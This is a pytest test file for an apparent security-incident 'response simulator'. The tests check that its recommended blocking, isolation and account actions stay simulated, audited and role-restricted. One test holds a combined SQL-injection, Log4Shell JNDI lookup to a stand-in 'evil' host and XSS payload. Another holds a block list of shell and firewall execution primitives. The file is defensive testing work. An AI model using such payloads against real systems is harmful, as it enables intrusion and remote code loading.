"""Response Simulator: deterministic recommendations, zero real side effects."""
import re
import time
from pathlib import Path

import pytest

from app.services.response.recommend import SimAction, recommend
from app.services.response.simulate import DISCLAIMER, simulate_all

_SCEN = Path(__file__).resolve().parents[2] / "sample_logs" / "security_scenarios" / "scenario_brute_force"


# --- recommendation engine (pure) ---

def test_bruteforce_recommendation():
    rec = recommend(
        rule_keys=["RULE_1", "RULE_3"],
        entity={"source_ip": "IP_ABC", "type": "source_ip"},
        correlation={"hosts": ["h1", "h2"], "sources": ["linux", "firewall"], "dest_ports": {"22": 9}},
        counts={"auth_failures": 9, "sources": 2},
        shield_verdicts=[],
    )
    assert rec.available and rec.category == "BRUTE_FORCE"
    assert rec.label == "Block source IP"
    assert rec.actions[0].action == "BLOCK_SOURCE"
    assert rec.actions[0].target == "IP_ABC"
    assert rec.actions[0].port == 22
    assert all(a.mode == "SIMULATION_ONLY" for a in rec.actions)


def test_portscan_recommendation():
    rec = recommend(
        rule_keys=["RULE_5"], entity={"source_ip": "IP_S"},
        correlation={"hosts": [], "sources": ["firewall"]},
        counts={"connections_denied": 6}, shield_verdicts=[],
    )
    assert rec.category == "PORT_SCAN" and rec.available
    assert any(a.action == "BLOCK_SOURCE" for a in rec.actions)
    assert any(a.action == "INCREASE_MONITORING" for a in rec.actions)


def test_suspicious_authentication_recommendation():
    rec = recommend(
        rule_keys=["RULE_6"], entity={"username": "USER_X"},
        correlation={"hosts": [], "sources": ["linux"]},
        counts={"auth_failures": 5, "auth_successes": 1}, shield_verdicts=[],
    )
    assert rec.category == "SUSPICIOUS_AUTHENTICATION"
    assert "USER_X" in rec.label
    assert any(a.action == "DISABLE_ACCOUNT_SIMULATION" for a in rec.actions)


def test_suspicious_execution_from_shield_verdict():
    rec = recommend(
        rule_keys=["RULE_7"], entity={"host": "web-01"},
        correlation={"hosts": ["web-01"], "sources": ["app"]},
        counts={}, shield_verdicts=["WEAPONIZED_LOG"],
    )
    assert rec.category == "SUSPICIOUS_EXECUTION"
    assert any(a.action == "ISOLATE_HOST" for a in rec.actions)
    assert any(a.action == "COLLECT_EVIDENCE" for a in rec.actions)


def test_unknown_alert_type_has_no_recommendation():
    rec = recommend(rule_keys=["RULE_99"], entity={}, correlation={}, counts={}, shield_verdicts=[])
    assert rec.available is False
    assert rec.label == "No automated response recommendation available."
    assert rec.actions == []


def test_missing_entity_falls_back_gracefully():
    rec = recommend(rule_keys=["RULE_1"], entity={}, correlation={}, counts={"auth_failures": 5},
                    shield_verdicts=[])
    # brute force but no source ip to act on
    assert rec.available is False


def test_attacker_strings_in_evidence_stay_inert():
    payload = "'; DROP TABLE users;-- ${jndi:ldap://evil/x} <script>alert(1)</script>"
    rec = recommend(
        rule_keys=["RULE_1"], entity={"source_ip": payload},
        correlation={"hosts": [payload], "sources": ["x"]},
        counts={"auth_failures": 5, "sources": 1}, shield_verdicts=[],
    )
    result = simulate_all(rec.actions)
    blob = str(result)
    # the payload appears only as an opaque target string, never interpreted
    assert payload in result["primary"]["target"]
    assert "SIMULATION" in blob


# --- simulation primitives ---

def test_simulation_is_pure_representation():
    r = simulate_all([SimAction("BLOCK_SOURCE", target="IP_Z", port=443, protocol="TCP")])
    assert r["simulation"] is True and r["no_real_change"] is True
    assert r["disclaimer"] == DISCLAIMER
    p = r["primary"]
    assert p["state_change"] == {"before": "ALLOW", "after": "WOULD BLOCK"}
    assert "WOULD BLOCK" in str(p["after"])


def test_no_execution_primitives_in_response_code():
    root = Path(__file__).resolve().parents[1] / "app" / "services" / "response"
    banned = re.compile(
        r"\b(subprocess|os\.system|Popen|shell\s*=\s*True|powershell|iptables|nft|netsh|"
        r"winreg|ctypes)\b"
    )
    for py in root.rglob("*.py"):
        text = py.read_text(encoding="utf-8")
        assert not banned.search(text), f"{py.name} references an execution/infra primitive"


# --- API + audit + no side effects ---

def _wait(client, headers, job_id):
    for _ in range(80):
        j = client.get(f"/api/ingestion/jobs/{job_id}", headers=headers).json()
        if j["status"] in ("COMPLETED", "FAILED"):
            return j
        time.sleep(0.2)
    raise AssertionError("job timeout")


@pytest.fixture(scope="module")
def alert_id(client_module, analyst_headers_module):
    client, headers = client_module, analyst_headers_module
    for f in ["linux.log", "firewall.log", "application.jsonl", "windows.jsonl"]:
        r = client.post("/api/ingestion/upload", headers=headers,
                        files={"file": (f, (_SCEN / f).read_bytes(), "text/plain")},
                        data={"source_name": f.split(".")[0]})
        _wait(client, headers, r.json()["id"])
    client.post("/api/detection/run", headers=headers, json={"since_hours": 24})
    alerts = client.get("/api/alerts", headers=headers).json()["items"]
    return next(a for a in alerts if a["entity"].get("type") == "source_ip")["id"]


def test_simulate_endpoint_shape_and_flag(client_module, analyst_headers_module, alert_id):
    r = client_module.post("/api/response/simulate", headers=analyst_headers_module,
                           json={"alert_id": alert_id})
    assert r.status_code == 200
    body = r.json()
    assert body["simulation"] is True
    assert "SIMULATION ONLY" in body["disclaimer"]
    assert body["audit_id"]
    assert body["recommendation"]["category"] == "BRUTE_FORCE"
    assert body["result"]["no_real_change"] is True
    assert body["result"]["primary"]["state_change"]["after"] == "WOULD BLOCK"


def test_simulation_creates_audit_records(client_module, analyst_headers_module, admin_headers, alert_id):
    client_module.post("/api/response/simulate", headers=analyst_headers_module,
                       json={"alert_id": alert_id})
    sims = client_module.get("/api/response/simulations", headers=analyst_headers_module).json()
    assert len(sims) >= 1
    assert all(s["simulation_only"] is True for s in sims)
    assert sims[0]["actor_email"]
    assert sims[0]["recommendation"]["category"]
    # also a generic audit-log entry
    logs = client_module.get("/api/users/audit-logs?action=response.simulate", headers=admin_headers).json()
    assert logs["total"] >= 1
    assert "SIMULATION_ONLY" in logs["items"][0]["detail"]


def test_client_cannot_inject_actions_or_change_risk(client_module, analyst_headers_module, alert_id):
    before = client_module.get(f"/api/alerts/{alert_id}", headers=analyst_headers_module).json()["alert"]
    bad = client_module.post("/api/response/simulate", headers=analyst_headers_module,
                             json={"alert_id": alert_id, "action": "RM_RF", "risk": 0,
                                   "severity": "info", "target": "1.2.3.4"})
    assert bad.status_code == 422  # extra fields forbidden
    after = client_module.get(f"/api/alerts/{alert_id}", headers=analyst_headers_module).json()["alert"]
    assert after["risk_score"] == before["risk_score"]
    assert after["severity"] == before["severity"]


def test_repeated_simulations_are_idempotent_side_effect_free(client_module, analyst_headers_module, alert_id):
    a0 = client_module.get("/api/alerts", headers=analyst_headers_module).json()
    for _ in range(4):
        r = client_module.post("/api/response/simulate", headers=analyst_headers_module,
                               json={"alert_id": alert_id})
        assert r.json()["simulation"] is True
    a1 = client_module.get("/api/alerts", headers=analyst_headers_module).json()
    assert [x["risk_score"] for x in a1["items"]] == [x["risk_score"] for x in a0["items"]]
    assert [x["status"] for x in a1["items"]] == [x["status"] for x in a0["items"]]


def test_unknown_alert_returns_404(client_module, analyst_headers_module):
    assert client_module.post("/api/response/simulate", headers=analyst_headers_module,
                              json={"alert_id": "does-not-exist"}).status_code == 404
    assert client_module.get("/api/response/recommend/does-not-exist",
                             headers=analyst_headers_module).status_code == 404


def test_viewer_cannot_simulate(client_module, analyst_headers_module, alert_id):
    admin = client_module.post("/api/auth/login",
                               json={"email": "admin@ulpf.io", "password": "AdminPass!123"}).json()["access_token"]
    client_module.post("/api/users", headers={"Authorization": f"Bearer {admin}"},
                       json={"email": "resp-viewer@ulpf.io", "password": "ViewerPass!8", "role": "VIEWER"})
    tok = client_module.post("/api/auth/login",
                             json={"email": "resp-viewer@ulpf.io", "password": "ViewerPass!8"}).json()["access_token"]
    r = client_module.post("/api/response/simulate", headers={"Authorization": f"Bearer {tok}"},
                           json={"alert_id": alert_id})
    assert r.status_code == 403
